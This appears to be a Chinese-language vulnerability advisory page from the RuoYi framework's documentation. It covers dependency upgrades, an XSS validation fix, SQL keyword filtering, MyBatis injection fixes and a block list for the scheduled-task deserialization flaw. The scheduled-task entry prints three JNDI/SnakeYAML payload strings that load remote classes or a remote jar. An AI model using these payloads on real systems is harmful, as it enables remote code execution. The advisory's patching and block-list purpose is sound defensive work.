href="https://github.com/thymeleaf/thymeleaf-spring/issues/256" target="_blank" rel="noopener noreferrer">https://github.com/thymeleaf/thymeleaf-spring/issues/256<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>添加代码到<code>pom.xml</code>依赖升级处理，防止远程代码执行漏洞。</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>thymeleaf.version</span><span class="token punctuation">&gt;</span></span>3.0.14.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>thymeleaf.version</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- thymeleaf模板引擎和spring框架的整合 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>thymeleaf-spring5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${thymeleaf.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${thymeleaf.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>在<code>&lt;= log4j2:2.17.0</code>组件中，<code>log4j2</code>存在远程代码执行和不受控制的递归漏洞。详细描述参见 <a href="https://gitee.com/y_project/RuoYi/issues/I4LW93" target="_blank" rel="noopener noreferrer">https://gitee.com/y_project/RuoYi/issues/I4LW93<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>添加代码到<code>pom.xml</code>依赖升级处理，防止远程代码执行和不受控制的递归漏洞。</p> <div class="language-xml line-numbers-mode"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log4j2.version</span><span class="token punctuation">&gt;</span></span>2.17.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>log4j2.version</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- log4j日志组件 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${log4j2.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-to-slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${log4j2.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>在用户管理页面，导入用户<code>xlsx</code>数据内容存在被<code>XSS</code>注入的风险，需要在提交时进行数据内容校验。完整代码提交。<a href="https://gitee.com/y_project/RuoYi/commit/5587d39d42b9d642ed44acc56e2d7bc3adf3a037" target="_blank" rel="noopener noreferrer">自定义xss校验注解实现，防止用户导入Xss风险漏洞<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>找到<code>SysUser.java</code>类，然后实体类新增<code>@Xss</code>注解进行校验（关键代码）</p> <div class="language-java line-numbers-mode"><div class="highlight-lines"><div class="highlighted"> </div><br><br><br><br><br><div class="highlighted"> </div><br><br><br><br><br></div><pre class="language-java"><code><span class="token annotation punctuation">@Xss</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">&quot;登录账号不能包含脚本字符&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLoginName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> loginName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token annotation punctuation">@Xss</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">&quot;用户昵称不能包含脚本字符&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getUserName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> userName<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>找到<code>SysUserServiceImpl.java</code>类，然后修改导入用户数据方法，增加实体类校验（关键代码）</p> <div class="language-java line-numbers-mode"><div class="highlight-lines"><div class="highlighted"> </div><div class="highlighted"> </div><br><br><br><div class="highlighted"> </div><br><br><br><br><div class="highlighted"> </div><br><br><br></div><pre class="language-java"><code><span class="token annotation punctuation">@Autowired</span>
<span class="token keyword">protected</span> <span class="token class-name">Validator</span> validator<span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNull</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">BeanValidators</span><span class="token punctuation">.</span><span class="token function">validateWithException</span><span class="token punctuation">(</span>validator<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>isUpdateSupport<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token class-name">BeanValidators</span><span class="token punctuation">.</span><span class="token function">validateWithException</span><span class="token punctuation">(</span>validator<span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>在代码生成页面，创建表功能存在<code>SQL</code>注入漏洞风险（这个功能只有admin用户才能操作），可以在创建表时填入一些SQL注入代码，需要在创建前进行语法校验。完整代码提交。<a href="https://gitee.com/y_project/RuoYi/commit/452da5caebf52b0e690a634f47cc7e538155ec24" target="_blank" rel="noopener noreferrer">代码生成创建表检查关键字，防止注入风险<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>找到<code>GenController.java</code>类，然后修改创建表方法。增加<code>SQL</code>关键字校验（关键代码）</p> <div class="language-java line-numbers-mode"><div class="highlight-lines"><br><br><br><br><div class="highlighted"> </div><br><br><br><br><br><br><br><br><br><br></div><pre class="language-java"><code><span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">String</span> sql<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">try</span>
	<span class="token punctuation">{</span>
		<span class="token class-name">SqlUtil</span><span class="token punctuation">.</span><span class="token function">filterKeyword</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token class-name">AjaxResult</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;创建表结构异常[&quot;</span> <span class="token operator">+</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;]&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>解决方案：上述漏洞可以升级<code>RuoYi</code>版本到<code>4.7.2</code>，或按示例进行操作，防止出现系统安全漏洞。</p> <br> <br> <ul><li>存在远程执行漏洞 <code>RuoYi &lt;= v4.6.2</code></li></ul> <p>漏洞详细：</p> <p>定时任务存在反序列化漏洞利用点，可以通过发送<code>rmi</code>、<code>http</code>、<code>ldap</code>请求，完成命令执行攻击。</p> <p>如目标字符串具体内容<code>rmi</code>：<code>org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')</code></p> <p>如目标字符串具体内容<code>ldap(s)</code>：<code>javax.naming.InitialContext.lookup('ldap://127.0.0.1:9999/#Exploit')</code></p> <p>如目标字符串具体内容<code>http(s)</code>：<code>org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1/poc/yaml-payload.jar&quot;]]]]')</code></p> <p>新增/修改定时任务<code>SysJobController.java</code>示例代码（屏蔽<code>rmi</code>、<code>ldap</code>、<code>http(s)</code>目标字符串）</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">LOOKUP_RMI</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;新增任务'&quot;</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;'失败，目标字符串不允许'rmi'调用&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsAnyIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">LOOKUP_LDAP</span><span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">LOOKUP_LDAPS</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;新增任务'&quot;</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;'失败，目标字符串不允许'ldap(s)'调用&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsAnyIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">HTTP</span><span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">HTTPS</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;新增任务'&quot;</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;'失败，目标字符串不允许'http(s)'调用&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">containsAnyIgnoreCase</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">JOB_ERROR_STR</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;新增任务'&quot;</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;'失败，目标字符串存在违规&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">ScheduleUtils</span><span class="token punctuation">.</span><span class="token function">whiteList</span><span class="token punctuation">(</span>job<span class="token punctuation">.</span><span class="token function">getInvokeTarget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">&quot;新增任务'&quot;</span> <span class="token operator">+</span> job<span class="token punctuation">.</span><span class="token function">getJobName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;'失败，目标字符串不在白名单内&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p>解决方案：升级<code>RuoYi</code>版本到 <code>&gt; 4.6.2</code>，或者添加示例代码处理，防止注入漏洞。</p> <br> <br> <ul><li>存在SQL注入漏洞 <code>RuoYi &lt;= v4.6.1</code></li></ul> <p><code>Mybatis</code>配置中使用了<code>$</code>所以会存在<code>sql</code>注入漏洞。</p> <p>漏洞详细：</p> <p>1、<code>SysDeptMapper.xml</code>中的<code>updateParentDeptStatus</code>节点使用了<code>${ancestors}</code>，修改相关逻辑。转成数组方式修改部门状态。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token comment">/**
 * 修改该部门的父级部门状态
 * 
 * @param dept 当前部门
 */</span>
<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">updateParentDeptStatusNormal</span><span class="token punctuation">(</span><span class="token class-name">Dept</span> dept<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token class-name">String</span> ancestors <span class="token operator">=</span> dept<span class="token punctuation">.</span><span class="token function">getAncestors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">Long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> deptIds <span class="token operator">=</span> <span class="token class-name">Convert</span><span class="token punctuation">.</span><span class="token function">toLongArray</span><span class="token punctuation">(</span>ancestors<span class="token punctuation">)</span><span class="token punctuation">;</span>
	deptMapper<span class="token punctuation">.</span><span class="token function">updateDeptStatusNormal</span><span class="token punctuation">(</span>deptIds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>2、数据权限相关使用了<code>${params.dataScope}</code>，<code>DataScopeAspect.java</code>数据过滤处理时添加<code>clearDataScope</code>拼接权限<code>sql</code>前先清空<code>params.dataScope</code>参数防止注入。</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DataScopeAspect</span>
<span class="token punctuation">{</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
	<span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">&quot;dataScopePointCut()&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doBefore</span><span class="token punctuation">(</span><span class="token class-name">JoinPoint</span> point<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span>
	<span class="token punctuation">{</span>
		<span class="token function">clearDataScope</span><span class="token punctuation">(</span>point<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">handleDataScope</span><span class="token punctuation">(</span>point<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">clearDataScope</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">JoinPoint</span> joinPoint<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token class-name">Object</span> params <span class="token operator">=</span> joinPoint<span class="token punctuation">.</span><span class="token function">getArgs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> params <span class="token keyword">instanceof</span> <span class="token class-name">BaseEntity</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token class-name">BaseEntity</span> baseEntity <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BaseEntity</span><span class="token punctuation">)</span> params<span class="token punctuation">;</span>
			baseEntity<span class="token punctuation">.</span><span class="token function">getParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token constant">DATA_SCOPE</span><span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
